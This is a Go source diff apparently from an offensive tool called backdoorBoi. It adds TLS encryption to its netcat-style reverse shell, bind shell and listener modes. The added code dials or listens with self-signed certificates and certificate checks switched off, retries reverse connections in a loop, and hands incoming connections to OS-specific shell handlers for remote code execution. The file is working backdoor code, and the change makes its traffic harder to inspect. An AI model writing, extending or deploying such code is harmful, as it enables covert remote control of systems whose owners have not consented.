@@ -2,6 +2,7 @@ package netcat
 
 import (
 	"bufio"
+	"crypto/tls"
 	"flag"
 	"fmt"
 	"io"
@@ -12,6 +13,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/BuildAndDestroy/backdoorBoi/pkg/encryption"
 	"github.com/BuildAndDestroy/backdoorBoi/pkg/environment"
 )
 
@@ -22,6 +24,7 @@ type NetcatInput struct {
 	Reverse     bool
 	Caller      bool
 	Listener    bool
+	Tls         bool
 }
 
 func (nni *NetcatInput) SetNetcatInput(fs *flag.FlagSet) {
@@ -31,6 +34,7 @@ func (nni *NetcatInput) SetNetcatInput(fs *flag.FlagSet) {
 	fs.BoolVar(&nni.Reverse, "reverse", false, "Set Flag for a Reverse Shell. Note: do not use with --bind")
 	fs.BoolVar(&nni.Caller, "caller", false, "Call to a bind shell.")
 	fs.BoolVar(&nni.Listener, "listen", false, "Create a Listener for rev shells.")
+	fs.BoolVar(&nni.Tls, "tls", false, "Use encryption for Netcat connection. RECOMMENDED")
 }
 
 func NetcatArgLogic(nni *NetcatInput) {
@@ -40,17 +44,33 @@ func NetcatArgLogic(nni *NetcatInput) {
 		callAddress = fmt.Sprintf("%s:%d", nni.HostAddress, nni.Port)
 	)
 	NetcatArgumentExceptions(nni)
-	if nni.Bind {
+	if nni.Bind && !nni.Tls {
 		BindLogic(bindAddress, osRuntime)
 	}
-	if nni.Reverse {
+	if nni.Bind && nni.Tls {
+		encryption.GenerateSelfSignedServerCert()
+		TlsBindLogicServer(bindAddress, osRuntime)
+	}
+	if nni.Reverse && !nni.Tls {
 		ReverseLogic(callAddress, osRuntime)
 	}
-	if nni.Caller {
+	if nni.Reverse && nni.Tls {
+		encryption.GenerateSelfSignedClientCert()
+		TlsReverseLogic(callAddress, osRuntime)
+	}
+	if nni.Caller && !nni.Tls {
 		CallBindLogic(callAddress)
 	}
-	if nni.Listener {
+	if nni.Caller && nni.Tls {
+		encryption.GenerateSelfSignedClientCert()
+		TlsBindLogicClient(callAddress)
+	}
+	if nni.Listener && !nni.Tls {
 		OpenListener(bindAddress, osRuntime)
+	}
+	if nni.Listener && nni.Tls {
+		encryption.GenerateSelfSignedServerCert()
+		TlsOpenListener(bindAddress, osRuntime)
 	}
 }
 
@@ -77,7 +97,6 @@ func NetcatArgumentExceptions(nni *NetcatInput) {
 	if nni.Reverse && nni.Caller {
 		log.Fatalln("Cannot reverse and call at the same time.")
 	}
-
 	if nni.Bind && nni.Listener {
 		log.Fatalln("Cannot bind and listen at the same time.")
 	}
@@ -96,6 +115,47 @@ func ReverseLogic(callAddress string, osRuntime string) {
 			log.Println(err)
 			log.Println("[*] Retrying in 5 seconds")
 			time.Sleep(5 * time.Second)
+			continue
+		}
+		log.Printf("[*] Rev shell spawning, connecting to %s", callAddress)
+		switch osRuntime {
+		case "linux":
+			RevHandleLinux(caller)
+		case "windows":
+			RevHandleWindows(caller)
+		case "darwin":
+			RevHandleDarwin(caller)
+		default:
+			log.Fatalf("Unsupported OS, report bug for %s\n", osRuntime)
+		}
+	}
+}
+
+func TlsReverseLogic(callAddress string, osRuntime string) {
+	//Generate client cert and key
+	certPEM, keyPEM, err := encryption.GenerateSelfSignedClientCert()
+	if err != nil {
+		log.Fatalln(err)
+	}
+
+	cert, err := tls.X509KeyPair(certPEM, keyPEM)
+	if err != nil {
+		log.Fatalf("client: loadkeys: %s\n", err)
+	}
+
+	// Configure TLS with client certificate
+	tlsConfig := &tls.Config{
+		Certificates:       []tls.Certificate{cert},
+		InsecureSkipVerify: true,
+	}
+
+	for {
+		caller, err := tls.Dial("tcp", callAddress, tlsConfig)
+		if err != nil {
+			log.Println(err)
+			log.Println("[*] Retrying in 5 seconds")
+			time.Sleep(5 * time.Second)
+			continue
 		}
 		log.Printf("[*] Rev shell spawning, connecting to %s", callAddress)
 		switch osRuntime {
@@ -135,6 +195,78 @@ func BindLogic(bindAddress string, osRuntime string) {
 			log.Fatalf("Unsupported OS, report bug for %s\n", osRuntime)
 		}
 	}
+}
+
+func TlsBindLogicServer(bindAddress string, osRuntime string) {
+	//Generate server cert and key
+	certPEM, keyPEM, err := encryption.GenerateSelfSignedServerCert()
+	if err != nil {
+		log.Fatalln(err)
+	}
+	// Load server's certificate and private key
+	// cert, err := tls.LoadX509KeyPair("server.crt", "server.key")
+	cert, err := tls.X509KeyPair(certPEM, keyPEM)
+	if err != nil {
+		log.Fatalf("server: loadkeys: %s", err)
+	}
+
+	// Configure TLS with server certificate
+	tlsConfig := &tls.Config{
+		Certificates: []tls.Certificate{cert},
+	}
+	// Create a TLS listener
+	listener, err := tls.Listen("tcp", bindAddress, tlsConfig)
+	if err != nil {
+		log.Fatalf("server: listen: %s", err)
+	}
+	defer listener.Close()
+	log.Println("[*] Binding shell spawning for remote code execution")
+	for {
+		conn, err := listener.Accept()
+		log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
+		if err != nil {
+			log.Fatalln("Unable to accept connection.")
+		}
+		switch osRuntime {
+		case "linux":
+			go SimpleHandleLinux(conn)
+		case "windows":
+			go SimpleHandleWindows(conn)
+		case "darwin":
+			go SimpleHandleDarwin(conn)
+		default:
+			log.Fatalf("Unsupported OS, report bug for %s\n", osRuntime)
+		}
+	}
+}
+
+func TlsBindLogicClient(callAddress string) {
+	//Generate client cert and key
+	certPEM, keyPEM, err := encryption.GenerateSelfSignedClientCert()
+	if err != nil {
+		log.Fatalln(err)
+	}
+
+	cert, err := tls.X509KeyPair(certPEM, keyPEM)
+	if err != nil {
+		log.Fatalf("client: loadkeys: %s\n", err)
+	}
+
+	// Configure TLS with client certificate
+	tlsConfig := &tls.Config{
+		Certificates:       []tls.Certificate{cert},
+		InsecureSkipVerify: true,
+	}
+
+	caller, err := tls.Dial("tcp", callAddress, tlsConfig)
+	if err != nil {
+		log.Fatalf("client: dial: %s\n", err)
+	}
+	defer caller.Close()
+
+	log.Printf("[*] Bind shell spawning, connecting to %s", callAddress)
+
+	BindShellCall(caller)
 }
 
 func SimpleHandleLinux(conn net.Conn) {
@@ -238,6 +370,51 @@ func OpenListener(bindAddress string, osRuntime string) {
 	}
 	defer listener.Close()
 
+	log.Printf("Listener opened on %s\n", bindAddress)
+	// for {
+	conn, err := listener.Accept()
+	log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
+	if err != nil {
+		log.Fatalln("Unable to accept connection.")
+	}
+	for {
+		reader := bufio.NewReader(os.Stdin)
+		text, err := reader.ReadString('\n')
+		if err != nil {
+			log.Fatalln(err)
+		}
+		text = strings.TrimSpace(text)
+		_, err = io.WriteString(conn, text+"\n")
+		if err != nil {
+			log.Fatalln(err)
+		}
+		go io.Copy(os.Stdout, conn)
+	}
+}
+
+func TlsOpenListener(bindAddress string, osRuntime string) {
+	//Generate server cert and key
+	certPEM, keyPEM, err := encryption.GenerateSelfSignedServerCert()
+	if err != nil {
+		log.Fatalln(err)
+	}
+	// Load server's certificate and private key
+	// cert, err := tls.LoadX509KeyPair("server.crt", "server.key")
+	cert, err := tls.X509KeyPair(certPEM, keyPEM)
+	if err != nil {
+		log.Fatalf("server: loadkeys: %s", err)
+	}
+
+	// Configure TLS with server certificate
+	tlsConfig := &tls.Config{
+		Certificates: []tls.Certificate{cert},
+	}
+	// Create a TLS listener
+	listener, err := tls.Listen("tcp", bindAddress, tlsConfig)
+	if err != nil {
+		log.Fatalf("server: listen: %s", err)
+	}
+	defer listener.Close()
 	log.Printf("Listener opened on %s\n", bindAddress)
 	// for {
 	conn, err := listener.Accept()
